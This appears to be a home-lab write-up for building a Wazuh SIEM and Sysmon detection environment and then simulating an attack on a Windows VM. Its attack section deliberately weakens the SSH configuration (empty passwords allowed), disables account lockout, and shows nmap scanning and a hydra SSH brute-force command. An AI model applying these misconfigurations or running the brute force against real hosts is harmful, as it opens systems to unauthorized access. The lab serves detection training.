# Local Endpoint Detection Engineering & Incident Response Lab

## 1. Executive Summary & System Architecture
This project demonstrates the end-to-end engineering of a localized Security Operations Center (SOC) log pipeline and Endpoint Detection and Response (EDR) testing environment. The objective is to establish an isolated platform for emulating modern adversary tactics, engineering custom behavioral detection logic, and analyzing granular operating system telemetry without relying on cloud resources or traditional Active Directory infrastructure.

### Architectural Blueprint
- **Security Operations Console (Laptop 1):** Wazuh SIEM Manager (Distributed Single-Node Deployment running on Linux)
- **Target Workstation (Laptop 2):** Windows 10/11 Endpoint Virtual Machine monitored via Microsoft Sysmon and Wazuh Agent
- **Adversary Node (Laptop 2):** Kali Linux Virtual Machine / Local Malicious Execution Context

---

## 2. Phase 1: Security Operations Console Deployment
This phase establishes the central log aggregation, indexing, and visualization cluster using the open-source Wazuh SIEM platform.

### Deployment Log
- **Host Operating System:** Kali Linux (main)
- **Deployment Method:** Wazuh Automated All-in-One Installation Assistant
- **Commands Executed:**
```bash
sudo apt update && sudo apt upgrade -y
curl -sO [https://packages.wazuh.com/4.x/wazuh-install.sh](https://packages.wazuh.com/4.x/wazuh-install.sh)
sudo bash wazuh-install.sh -a
```
Wait for a while.When installtion is completed.Go to your browser and open [https://127.0.0.1](https://127.0.01)
![Click Continue](/images/image1.png)
Click on accept (the risk and continue)
![Credentials](/images/image2.png)
Add your credentails that was given after the installation.
![Setup](/images/image3.png)
Now we have successfully setup our wazuh on our Kali(laptop 1).

## 3. Phase 2 : Setting up Windows Machine

On it we need to install the wazuh agent for integrating windows with our wazuh server

```Powershell
Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.14.5-1.msi -OutFile $env:tmp\wazuh-agent.msi; msiexec.exe /i $env:tmp\wazuh-agent.msi /q WAZUH_MANAGER="YOUR_KALI_IP"
```
Remeber to replace your ip in this command
Now start your wazuh service on windows 
```Powershell 
Start-Service wazuhsvc
```
Check if is running
```Powershell 
Get-Service wazuhsvc
```
![Command](/images/image4.png)
Now we can look there is an active agent on wazuh server that is our windows machine
![Command](/images/image5.png)
Remeber to setup the sysmon on the windows machine. I already downloaded and isntalled on it.
You can go to this page to understand how to setup sysmon [Sysmon setup on wazuh](https://wazuh.com/blog/using-wazuh-to-monitor-sysmon-events/)

## 4. Phase 3 : Generate a Loud Telemetry Event on Windows

Now we need to verify that our sysmon actully sends the logs or event over the wire
so are going to simple command.
```bash
net user test test /add
```
On our windows terminal we will run this command as administrator.
Event id would be 4720  
Now we head to our discover tab on the wazuh server and type test in the search field
![Command](/images/image6.png)  
Now you can see our logs are piping in to our wazuh sever.

## 5. Phase 4 : Attack Simulation and Telemetry Validation.

For attack on windows we are going to make our ssh server on windows vulnerble.So the attacker kali can exploit it and perform full cyber chain attack using AI (scripts) .
To make it vulnerble first we open 
```bash 
C:\ProgramData\ssh\sshd_config
```
Remeber That you have ssh server and client on windows.  
Open up the file and locate the following configs. Use ctrl+f to find these.
```bash
Match Group administrators
    AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
```
Put a # in the start to comment them out  
```bash
PasswordAuthentication yes
PermitEmptyPasswords yes

# Match Group administrators
   #  AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys

```
Now configuration should look like above.  
It is a A05:2021-Security Misconfiguration.(You can perform attacks like brute force.)  

## Phase 4.1 : Pasive and Active Reconnaissance 

Now we will be on our attacking kali (Laptop 2).. 
First we check if our host is live 
```bash 
ping 192.168.100.75
```
![live](/images/pic7.png)  
We can see our host is live. 
Next we enumrate services and port using nmap.
```bash
sudo nmap -sS -sV -O 192.168.100.75
```
And we see our ssh service.
![ssh](/images/image8.png)  
Now we are going to perform a brute force attack using hydra 

NOTE!  
Before performing the brute force attack.Make sure that lockout threshold is 0.Otherwiese windows will be locked out after 5 attempts.
```cmd
net accounts /lockoutthreshold:0
```
Now perform the attack.
```bash
hydra -l victim -P /usr/share/wordlists/attacker_list 192.168.100.75 ssh -V
```
We can see our attack got successfull.We got the victim ssh password.
![password](/images/image9.png)  

